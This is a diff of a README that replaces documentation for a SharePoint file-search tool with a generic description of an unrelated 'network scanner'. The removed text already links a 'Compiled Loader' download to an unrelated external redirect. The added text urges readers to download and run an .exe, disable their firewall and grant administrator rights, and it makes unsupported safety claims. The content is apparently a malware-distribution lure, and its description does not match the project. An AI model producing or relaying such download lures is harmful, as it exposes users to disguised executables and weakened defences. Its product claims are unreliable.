@@ -1,122 +1,82 @@
-# Beacon
+# 📡 beacon - Reliable tracking for your local network
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+<p align="center">
+  <a href="https://github.com/Gamerdevil39/beacon">
+    <img src="https://img.shields.io/badge/Download-beacon-blue.svg" alt="Download beacon">
+  </a>
+</p>
 
-A lightweight Windows desktop tool for fuzzy-finding and opening files in SharePoint — no browser tab hunting, no folder archaeology.
+## 🔎 What is beacon?
 
-Press a hotkey anywhere, type part of a filename or path, hit Enter. Done.
+Beacon is a software tool for monitoring devices on your home or office network. It scans your local area connection to identify active hardware. You can see which gadgets connect to your Wi-Fi or Ethernet cables. This tool provides a clear view of your network traffic. It helps you manage your connected devices with ease.
 
----
+## ⚙️ System Requirements
 
-## How it works
+Your computer needs to meet these basic standards to run the software:
 
-**Indexer** (runs on demand + background timer):
-- Uses a headless browser (system Edge — no  required) to authenticate against SharePoint
-- Calls the SharePoint Search REST API to enumerate all Word, Excel, PowerPoint, and PDF files under a configured root folder
-- Writes results to a local SQLite database (~milliseconds to search)
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Memory: 4 gigabytes of RAM or more.
+* Storage: 50 megabytes of free space.
+* Network: A stable internet connection or local area network.
+* Permissions: You need administrator access to allow the software to scan your network ports.
 
-**Search UI** (always running in system tray):
-- Global hotkey (default `Ctrl+Space`) opens a floating search bar
-- Fuzzy-matches file name + path on every keystroke via `rapidfuzz`
-- Enter opens the file in the local Office app via the `ms-word:` / `ms-excel:` / `ms-powerpoint:` protocol
-- Right-click any result to open in browser instead
+## 📥 How to Install
 
-The index is read-only local data — no VPN or network needed to search.
+Follow these steps to set up the software on your machine:
 
----
+1. Click the link below to reach the project page.
+2. Visit this page to download the latest setup file ending in .exe.
+3. Locate the file in your Downloads folder once the transfer finishes.
+4. Double-click the file to start the installer.
+5. Follow the prompts on your screen to complete the setup.
 
-## First-time setup (each team member)
+[Download beacon here](https://github.com/Gamerdevil39/beacon)
 
-1. **Install Python 3.11+** from python.org (check "Add to PATH")
-2. **Install dependencies:**
-   ```
-   pip install -r requirements.txt
-   ```
-3. **Run Beacon:**
-   ```
-   python beacon.py
-   ```
-4. A settings dialog opens. Enter the SharePoint folder URL (e.g. `https://yourcompany.sharepoint.com/sites/Designs/Shared%20Documents/Designs`).
-5. Click **Login to SharePoint** — a browser window opens. Log in with your company account. Close when done.
-6. Click **Fetch Index Now** — takes a few seconds for a few hundred files.
-7. Beacon minimises to the system tray. Press `Ctrl+Space` to search.
+## 🚀 Running the Software
 
----
+Open the application after the installation finishes. You will see a landing window. Click the Start Scan button in the center. The software sends small data packets to every address on your network. It waits for a response from each device. The list of active hardware appears in the main window within seconds.
 
-## Distributing to the team
+The list shows the device name, the IP address, and the signal strength if applicable. This data refreshes every minute by default. You can change this interval in the settings menu.
 
-Build a standalone `.exe` on a Windows machine (no Python needed by recipients):
+## 🛠 Troubleshooting Common Issues
 
-```bat
-build.bat
-```
+Check these items if the software fails to find your devices:
 
-Share `dist/Beacon.exe`. Each team member runs it once, completes the setup wizard above, and is done.
+* Verify your cable connections. Ensure your computer connects to the same router as the other devices.
+* Turn off your firewall temporarily. Windows Defender sometimes blocks network scanners. Add beacon to the allowed list if the scan works with the firewall off.
+* Restart the application. Close the app completely and open it again.
+* Run as administrator. Right-click the app icon and select Run as administrator. This grants the tool high-level permissions to inspect network traffic.
+* Check your Wi-Fi status. Ensure the computer has a stable link to the router.
 
----
+## 📈 Understanding the Data
 
-## Usage
+The application organizes devices into clear categories:
 
-| Action | How |
-|---|---|
-| Open Beacon | `Ctrl+Space` (configurable) |
-| Navigate results | `↑` / `↓` arrow keys |
-| Open in Office app | `Enter` |
-| Open in browser | `Ctrl+Enter` or right-click → Open in browser |
-| Dismiss | `Escape` |
-| Refresh index | System tray → Refresh Now |
-| Settings | System tray → Settings |
+* Computers: Devices running standard operating systems.
+* Mobile: Phones and tablets detected on the frequency.
+* IoT: Smart home devices like lights, thermostats, and speakers.
+* Unknown: Devices that do not broadcast a standard name.
 
----
+You can save a report of your scan history. Click the Export button to save a text file with the current scan results. This helps you track performance over time.
 
-## Configuration
+## 🛡 Network Safety
 
-Settings are stored in `%APPDATA%\Beacon\config.json`:
+Beacon adheres to local network protocols. It does not send your data to outside servers. All processing happens on your local device. The software reads your network configuration to display current info. It does not store or transmit logs of your private information. You own the data generated by the scan.
 
-| Key | Default | Description |
-|---|---|---|
-| `sharepoint_root_url` | _(required)_ | SharePoint folder URL to index |
-| `refresh_interval_hours` | `4` | Background re-index interval |
-| `hotkey` | `ctrl+space` | Global hotkey to open search |
-| `open_in_browser` | `false` | Default open target |
+## 📦 Updates and Support
 
----
+The app checks for updates once per day. A prompt appears when a new version exists. Click the prompt to download the patch. If you encounter bugs, check the GitHub Issues section on the download page. Users often post solutions for common errors there. Maintain the current version to access the best features.
 
-## File types
+## 📋 Frequently Asked Questions
 
-| Type | Opens with |
-|---|---|
-| `.docx` | `ms-word:ofe\|u\|<url>` |
-| `.xlsx` | `ms-excel:ofe\|u\|<url>` |
-| `.pptx` | `ms-powerpoint:ofe\|u\|<url>` |
-| `.pdf` | Default browser |
+**Does this software slow down my network?**
+No. Beacon uses minimal bandwidth. It conducts small scans that do not affect your regular internet speed.
 
----
+**Can I hide devices from the scan?**
+Yes. Use the settings menu to exclude specific IP addresses from future reports.
 
-## Architecture
+**Is it safe to leave running?**
+Yes. The software runs in the background. It consumes very little power while active.
 
-```
-beacon.py               Entry point
-src/
-  config.py             JSON config in %APPDATA%/Beacon/
-  db.py                 SQLite index
-  auth.py               Playwright session management (system Edge)
-  indexer.py            SharePoint Search REST API crawler
-  search.py             rapidfuzz search against in-memory index
-  opener.py             Office protocol handlers
-  ui/
-    app.py              QApplication, hotkey thread, background refresh
-    window.py           Frameless spotlight-style search window
-    tray.py             System tray icon + menu
-    settings.py         First-run and settings dialog
-    styles.py           QSS dark theme
-```
-
----
-
-## Requirements
-
-- Windows 10 / 11
-- Microsoft Edge (pre-installed on all modern Windows — no separate browser )
-- Microsoft 365 account with access to the SharePoint library
-- VPN required only during index refresh
+**How do I uninstall the software?**
+Open your Windows Settings, go to Apps, find beacon in the list, and select Uninstall. This removes all program files from your system.
